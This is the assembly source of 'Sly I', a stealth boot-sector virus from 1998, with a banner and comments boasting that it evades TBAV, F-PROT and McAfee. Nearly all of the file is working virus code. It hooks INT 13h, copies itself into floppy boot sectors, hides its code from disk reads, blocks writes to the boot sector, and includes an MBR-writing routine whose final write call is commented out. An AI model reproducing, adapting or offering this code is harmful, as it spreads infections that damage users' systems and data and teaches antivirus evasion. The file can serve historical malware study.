

comment ~

                           Une production    

                          .ee.           ee     $$
                          d$$b           $$     $
                          $$$$           $$              
                         .$F3$.          $$
                         d$"^$b          $$
                         $$..$$          $$
                        .$$$$$$.         $$              
                        d$""""$b         $$.....         
                        $$    $$         $$$$$$$         
                        ""    ""         """""""         


            .ee.   eeeeec.  eeeee.    zee     z$$$c  4er  4er eeeeeee
            d$$b   $$$$$$$  $$$$$$b   $$$r   d$$*$$b 4$F  4$F $$$$$$$         
            $$$$   $$   $$  $$  ^$$  .$P$$  .$P  ^$$ 4$F  4$F $$              
           .$F3$.  $$...$$  $$...$$  J$"$$  d$"   "" 4$L..J$F $$.....         
           d$"^$b  $$$$$$"  $$$$$$"  $$ 3$r $$       4$$$$$$F $$$$$$F         
           $$..$$  $$"*$E   $$"$$L  .$$.J$$ $$.   .  4$F""3$F $$"""""         
          .$$$$$$. $$  $$c  $$ ^$$. J$$$$$$ 4$L   $$ 4$F  4$F $$              
          d$""""$b $$  ^$$  $$  3$$ $$"""3$r $$e.d$P 4$F  4$F $$.....         
          $$    $$ $$   *$b $$   $$c$$   ^$$ ^*$$$P" 4$F  4$F $$$$$$$         
          ""    "" ""    "" ""   ^""""    ""   """   ^""  ^"" """""""         

                                  presents:
 
                           The 1st Sly I boot Virus 
           			coded in one day !			  
		  		Tested in one week !
				   JUNE 1998

In one word this is a poor and not optimized code ... Quick & dirty production

-------------------------------------------------------------------------------

þ When he (yes he is alive !) is active: 
- Defeat all ( the virus is hided when disk access ! ...)
- When EMM386.EXE isn't load can not defeat PROVIEW 1.2 :
  look at 13h chain | 9F80:00B1 !!! Unknown !!! | 

-> IS he REALLY FULL STEALTH WHEN ACTIVE ?

þ When he is not active:

Can defeat:
- TBAV heuristic scanner as TBSCAN (BEST ONE !)
  Just O Flag (overwrite/move a program to memory)
  WATCHDOG utility as TBDRIVER/TBDISK
- F-PROT heuristic scanner (even with /paranoid switch set !)
  Nota: I can't believe this ???
- SCAN scanner of McAfee

Can not defeat: (reported as an unknown boot sector virus) 
- Boot sector virus resident WATCHDOG anti-virus such as
  F-PROT utility as VIRSTOP ... very sensitive ...

þ Problems:
- When 32bitDiskAccess=on under Windows ... (entry point address)

-------------------------------------------------------------------------------

~

..286
..model tiny ; TASM SUPPORT !
	org     0        
..code
s:	
        mov     si,7C00h
        mov     bx,302h 		; for Memory calculation (see below)

        xor     ax,ax
	mov     es,ax

	cli
	mov     ss,ax                   ;Setup the stack
	mov     sp,si
	sti

	mov     ds,ax                   ;DS,CS,ES,SS=0

        dec word ptr ds:[bx+111h]       ;0:413 / (302h+111h=413h)
				        ;= Memory in K,  Sub one K.

        mov word ptr ax,ds:[bx+111h]    ; Little Heuristic trick !

        shl     ax,6                    ;normaly 9FC0
	mov     es,ax                   ;ES = Virus Segment

        mov ax,200h  			;size of virus
        xchg cx,ax              	;Little Heuristic trick !

	cmp dl,80h
	jz disquedur1
disquette1:
        add si,3Eh			; FD Virus entry point
disquedur1:
	xor  di,di
        cld
        rep     movsb  ;Move virus to ES:0

        mov     bx,13h*4-1		; 13 h vector !
        inc     bx			; Little Heuristic trick !

        mov     ax,word ptr ds:[bx]     ;Get int13h from vector table.
	mov     word ptr es:[offset i13],ax
        mov     ax,word ptr ds:[bx+2]
	mov     word ptr es:[offset i13+2],ax

        ; Install our handler
        cli
        mov     word ptr ds:[bx],offset handler
        mov     word ptr ds:[bx+2],es
        sti

	push    es
	mov     ax,offset restart
	push    ax
	retf

Restart: ; WE ARE NOW AT TOM !
;On entry to the boot sector DL=Drive booted from.

	mov ax,es
	mov ds,ax    

	cmp dl,80h ; HD or FD ?
	jz disquedur2
	disquette2:
	jmp WriteonMBR
disquedur2:
jmp ChargebootDisque

WriteonMBR:

        add ax,512/16
        mov es,ax
        xor bx,bx
 
        mov     ax,201h  ;read MBR -> buffer
        mov     ch,0 ;cylindre
        mov     cl,1 ;secteur
        mov     dh,0 ;tete
        mov     dl,80h
	call int13h

        ;copy virus code -> buffer ; ds:si->es:di

        xor     si,si
	xor     di,di
        mov     cx,End_Virus-s   ; size of virus
	cld
        rep     movsb                   ;Move code virus to ES:0

        xor     bx,bx
        mov     ch,0 ;cylindre
        mov     cl,1 ;secteur
        mov     dh,0 ;tete
        mov     dl,80h
        mov     ax,301h  ; write buffer -> MBR  !!!!!
; infect MBR or not ?
;        call int13h 


chargebootdisque:

	mov si,01beh ;1 byte of partition table

partb: ; find the first bootable partition
	mov byte ptr al,ds:[si]
	cmp al,80h ;if it is the first one
jz partok 
	add si,10h
jmp partb
partok:

	mov dx,word ptr ds:[si]  ; load head and drive
	mov cx,word ptr ds:[si+2] ; load cylinder and sector

	xor ax,ax
	mov es,ax
	mov bx,07c00h
	mov ax,0201h ;load boot sector
	call int13h

	db 0EAh,00,07Ch,00,00 ;JMP 0000:7C00 -> jmp to HD boot sector

;INT 13 HANDLER !
Handler:

        cmp     ax,0301h    
        je      bootprotector

	cmp     ah,02h    ;Reading the first sector ? ah,2
	jne     jend
	cmp     cx,1
	jne     jend
	cmp     dh,0
	jne	jend
	cmp     dl,80h  ; if it is HD ... GO OUT !
	jae     fakembr

	call    int13h 
	mov     ax,201h
	call    int13h 


Infect_Floppy: 

	pushf
	pusha
	push    es
	push    ds


        ;boot original en es:bx (+03eh for code entry)
	;copy of virus code on the buffer

        cmp     word ptr es:[bx + offset signature+03Eh],'lS'
        je      alreadyinfected ; if FD already infected

        mov ax,cs
        mov ds,ax

	call @ici
	@ici:
	pop si
	sub si,offset @ici
	
        mov di,bx
        add di,03Eh
        mov cx,End_Virus-s   ; size of virus
        cld
        rep     movsb   ;DS:SI ->ES:DI

	mov     byte ptr es:[bx+1],03Ch ; JMP at virus entry on boot (3Eh)

        mov     ch,0 ;cylindre
        mov     cl,1 ;secteur
        mov     dh,0 ;tete
        mov     dl,0h
        mov     ax,301h  ;write buffer on FD boot
	call int13h

alreadyinfected:

        mov di,bx
        add di,3eh
        mov al,0
        mov cx,End_Virus-s ;size of virus
        rep stosb          ;hide virus to eyes (fill of 0)

	mov word ptr es:[bx+510],0AA55h ;signature

	pop     ds
	pop     es
	popa
	popf
          
        retf 2

bootprotector:
	cmp     cx,1
	jne     jend
	cmp 	dh,0
	jne 	jend

        ; Protected MBR/FB BOOT sector of write ( no more immunize !)
        retf 2

jend:
	db      0eah                    ;Stands for Jmpf
	i13     dd      0               ;The original int13h

fakembr:
	call int13h 
	pushf
        pusha
        mov di,bx
        mov al,0
        mov cx,End_Virus-s ;size of virus
        rep stosb          ;hide virus to eyes (fill of 0)
        popa
	popf
        retf 2
        

Int13h  proc    near

	pushf
	call    dword ptr cs:[i13]
	ret

Int13h  endp


Signature  db 'Sly I 1998 / VLAD Aim & Policies' 
End_Virus:
end s
